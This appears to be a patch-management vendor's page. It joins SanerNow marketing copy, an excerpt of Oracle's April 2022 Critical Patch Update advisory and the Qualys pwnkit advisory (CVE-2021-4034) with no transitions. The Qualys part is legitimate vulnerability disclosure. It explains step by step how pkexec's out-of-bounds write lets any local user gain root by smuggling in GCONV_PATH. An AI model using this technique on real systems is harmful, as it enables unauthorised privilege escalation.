SanerNow auto patching software is an ideal solution for hybrid workforces. You can easily deploy patches across globally distributed devices from a centralized cloud patch management solution. Furthermore, all the patching tasks, from scanning to deployment, are executed by a single lightweight multifunctional agent installed in the endpoints. You can also go for the agent-less option, which is a unique approach to scanning while retaining the scan speed and accuracy.

 Risk based Prioritization to Deploy Patches Smartly

SanerNow auto patching tool thoroughly assesses the patches and prioritizes them based on their business context, technical impact, severity level, and more intelligence to help focus on critical patches immediately. Additionally, you can deploy these patches quickly to reduce risk exposure and plan your remediation efforts wisely.

 Firmware Patches for Complete Risk Mitigation

As important as the software application patches, firmware patches are critical to tightening IT security. Moreover, it is recommended to include firmware patching as you establish your automated patch management cadence to reduce security risk exposure. SanerNow patch manager supports patching for firmware updates to fix issues and errors in firmware.

 Continuous and Customizable Patch Scans to Identify Missing Patches

Move away from the periodic scans and make it a continuous process with SanerNow patch management software. Keep your patching up-to-date with customized, real-time, and continuous scans for verified patches based on your IT environment. You can additionally perform real-time, on-demand, scheduled, and automated patch scans with the SanerNow patch management tool.

 Cross-Platform Patching with Support for Third-Party Apps

SanerNow patch management tool supports multi-platform patching for all major operating systems like Windows, macOS, Linux, and 550+ third-party applications. SanerNow’s automated patching solution additionally maintains a pre-built patch repository for third-party application patches.

 Effortless Patch Rollback for an Error-Prone Patching

Patch rollback is made easier with the SanerNow automated patch management tool to avoid disruptions in business operations. It rollbacks the last stable version with zero downtime and a single click to easily deal with incompatible and error-prone software patches.

 Comply with Industry Benchmarks and Security Standards

Various industry regulatory standards and organizations mandate patch compliance. SanerNow auto patch management software provides a unified view of your software patch compliance to address deviations from compliance standards and deploy patches accordingly. However, with auto patching in SanerNow, you can quickly fix the misconfigurations and achieve compliance with regulatory standards.

 Insights and Tracking with Reports and Audit Logs

Track detailed insights on your patching metrics with auto-generated reports and an inbuilt audit log. SanerNow automated patch management software provides a wide range of reports to assess the patching status in your network. Additionally, SanerNow provides an insightful Patch Impact Report to analyze the impact of patches and track the patching activities.

![](https://www.secpod.com/wp-content/uploads/2024/06/Asset-12@4x-8-1024x954-3.webp)

*“SanerNow’s patch management capabilities stand out from the competition since it can patch all the discovered vulnerabilities and perform other system-hardening actions. Even if no direct remediation is available, SanerNow applies security controls that provide workarounds for the* *vulnerabilities.”*

**– Swetha Krishnamoorthi, Senior Industry Analyst, Cybersecurity, Frost & Sullivan**

SanerNow Patch Management can do this for you without causing any errors. You can return to the previous working version with just one click. This makes it easy to fix any issues caused by software updates.

Test & Approve Patches before Deploying

### Test & Approve Patches before Deploying

Directly applying patches to your working environment is risky. SanerNow Patch Management allows you to set up a safe testing area to check if these updates work before you put them in your main work environment. Once you are sure they won’t cause any issues, you can apply these approved patches to your network to avoid disruptions and productivity issues.

## Oracle Critical Patch Update Advisory - April 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 520 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2857016.1).

A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

This Critical Patch Update contains 54 new security patches plus additional third party patches noted below for Oracle Fusion Middleware.  41 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update April 2022 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2853458.2](https://support.oracle.com/rs?type=doc&id=2853458.2).

Qualys Security Advisory
pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)
========================================================================
Contents
========================================================================
Summary
Analysis
Exploitation
Acknowledgments
Timeline
========================================================================
Summary
========================================================================
We discovered a Local Privilege Escalation (from any user to root) in
polkit's pkexec, a SUID-root program that is installed by default on
every major Linux distribution:
"Polkit (formerly PolicyKit) is a component for controlling system-wide
privileges in Unix-like operating systems. It provides an organized way
for non-privileged processes to communicate with privileged ones. [...]
It is also possible to use polkit to execute commands with elevated
privileges using the command pkexec followed by the command intended to
be executed (with root permission)." (Wikipedia)
This vulnerability is an attacker's dream come true:
- pkexec is installed by default on all major Linux distributions (we
exploited Ubuntu, Debian, Fedora, CentOS, and other distributions are
probably also exploitable);
- pkexec is vulnerable since its creation, in May 2009 (commit c8c3d83,
"Add a pkexec(1) command");
- any unprivileged local user can exploit this vulnerability to obtain
full root privileges;
- although this vulnerability is technically a memory corruption, it is
exploitable instantly, reliably, in an architecture-independent way;
- and it is exploitable even if the polkit daemon itself is not running.
We will not publish our exploit immediately; however, please note that
this vulnerability is trivially exploitable, and other researchers might
publish their exploits shortly after the patches are available. If no
patches are available for your operating system, you can remove the
SUID-bit from pkexec as a temporary mitigation; for example:
# chmod 0755 /usr/bin/pkexec
This vulnerability is one of our most beautiful discoveries; to honor
its memory, we recommend listening to DJ Pone's "Falken's Maze" (double
pun intended) while reading this advisory. Thank you very much!
========================================================================
Analysis
========================================================================
pkexec is a sudo-like, SUID-root program, described as follows by its
man page:
------------------------------------------------------------------------
NAME
pkexec - Execute a command as another user
SYNOPSIS
pkexec [--version] [--disable-internal-agent] [--help]
pkexec [--user username] PROGRAM [ARGUMENTS...]
DESCRIPTION
pkexec allows an authorized user to execute PROGRAM as another
user. If PROGRAM is not specified, the default shell will be run.
If username is not specified, then the program will be executed
as the administrative super user, root.
------------------------------------------------------------------------
The beginning of pkexec's main() function processes the command-line
arguments (lines 534-568), and searches for the program to be executed
(if its path is not absolute) in the directories of the PATH environment
variable (lines 610-640):
------------------------------------------------------------------------
435 main (int argc, char \*argv[])
436 {
...
534 for (n = 1; n < (guint) argc; n++)
535 {
...
568 }
...
610 path = g\_strdup (argv[n]);
...
629 if (path[0] != '/')
630 {
...
632 s = g\_find\_program\_in\_path (path);
...
639 argv[n] = path = s;
640 }
------------------------------------------------------------------------
Unfortunately, if the number of command-line arguments argc is 0 (if the
argument list argv that we pass to execve() is empty, i.e. {NULL}), then
argv[0] is NULL (the argument list's terminator) and:
- at line 534, the integer n is permanently set to 1;
- at line 610, the pointer path is read out-of-bounds from argv[1];
- at line 639, the pointer s is written out-of-bounds to argv[1].
But what exactly is read from and written to this out-of-bounds argv[1]?
To answer this question, we must digress briefly. When we execve() a new
program, the kernel copies our argument and environment strings and
pointers (argv and envp) to the end of the new program's stack; for
example:
|---------+---------+-----+------------|---------+---------+-----+------------|
| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |
|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|
V V V V V V
"program" "-option" NULL "value" "PATH=name" NULL
Clearly (because the argv and envp pointers are contiguous in memory),
if argc is 0, then the out-of-bounds argv[1] is actually envp[0], the
pointer to our first environment variable, "value". Consequently:
- at line 610, the path of the program to be executed is read
out-of-bounds from argv[1] (i.e. envp[0]), and points to "value";
- at line 632, this path "value" is passed to g\_find\_program\_in\_path()
(because "value" does not start with a slash, at line 629);
- g\_find\_program\_in\_path() searches for an executable file named "value"
in the directories of our PATH environment variable;
- if such an executable file is found, its full path is returned to
pkexec's main() function (at line 632);
- and at line 639, this full path is written out-of-bounds to argv[1]
(i.e. envp[0]), thus overwriting our first environment variable.
More precisely:
- if our PATH environment variable is "PATH=name", and if the directory
"name" exists (in the current working directory) and contains an
executable file named "value", then a pointer to the string
"name/value" is written out-of-bounds to envp[0];
- or, if our PATH is "PATH=name=.", and if the directory "name=." exists
and contains an executable file named "value", then a pointer to the
string "name=./value" is written out-of-bounds to envp[0].
In other words, this out-of-bounds write allows us to re-introduce an
"unsecure" environment variable (for example, LD\_PRELOAD) into pkexec's
environment; these "unsecure" variables are normally removed (by ld.so)
from the environment of SUID programs before the main() function is
called. We will exploit this powerful primitive in the following
section.
Last-minute note: polkit also supports non-Linux operating systems such
as Solaris and \*BSD, but we have not investigated their exploitability;
however, we note that OpenBSD is not exploitable, because its kernel
refuses to execve() a program if argc is 0.
========================================================================
Exploitation
========================================================================
Our question is: to successfully exploit this vulnerability, which
"unsecure" variable should we re-introduce into pkexec's environment?
Our options are limited, because shortly after the out-of-bounds write
(at line 639), pkexec completely clears its environment (at line 702):
------------------------------------------------------------------------
639 argv[n] = path = s;
...
657 for (n = 0; environment\_variables\_to\_save[n] != NULL; n++)
658 {
659 const gchar \*key = environment\_variables\_to\_save[n];
...
662 value = g\_getenv (key);
...
670 if (!validate\_environment\_variable (key, value))
...
675 }
...
702 if (clearenv () != 0)
------------------------------------------------------------------------
The answer to our question comes from pkexec's complexity: to print an
error message to stderr, pkexec calls the GLib's function g\_printerr()
(note: the GLib is a GNOME library, not the GNU C Library, aka glibc);
for example, the functions validate\_environment\_variable() and
log\_message() call g\_printerr() (at lines 126 and 408-409):
------------------------------------------------------------------------
88 log\_message (gint level,
89 gboolean print\_to\_stderr,
90 const gchar \*format,
91 ...)
92 {
...
125 if (print\_to\_stderr)
126 g\_printerr ("%s\n", s);
------------------------------------------------------------------------
383 validate\_environment\_variable (const gchar \*key,
384 const gchar \*value)
385 {
...
406 log\_message (LOG\_CRIT, TRUE,
407 "The value for the SHELL variable was not found the /etc/shells file");
408 g\_printerr ("\n"
409 "This incident has been reported.\n");
------------------------------------------------------------------------
g\_printerr() normally prints UTF-8 error messages, but it can print
messages in another charset if the environment variable CHARSET is not
UTF-8 (note: CHARSET is not security sensitive, it is not an "unsecure"
environment variable). To convert messages from UTF-8 to another
charset, g\_printerr() calls the glibc's function iconv\_open().
To convert messages from one charset to another, iconv\_open() executes
small shared libraries; normally, these triplets ("from" charset, "to"
charset, and library name) are read from a default configuration file,
/usr/lib/gconv/gconv-modules. Alternatively, the environment variable
GCONV\_PATH can force iconv\_open() to read another configuration file;
naturally, GCONV\_PATH is one of the "unsecure" environment variables
(because it leads to the execution of arbitrary libraries), and is
therefore removed by ld.so from the environment of SUID programs.
Unfortunately, CVE-2021-4034 allows us to re-introduce GCONV\_PATH into
pkexec's environment, and to execute our own shared library, as root.
Important: this exploitation technique leaves traces in the logs (either
"The value for the SHELL variable was not found the /etc/shells file" or
"The value for environment variable [...] contains suscipious content").
However, please note that this vulnerability is also exploitable without
leaving any traces in the logs, but this is left as an exercise for the
interested reader.
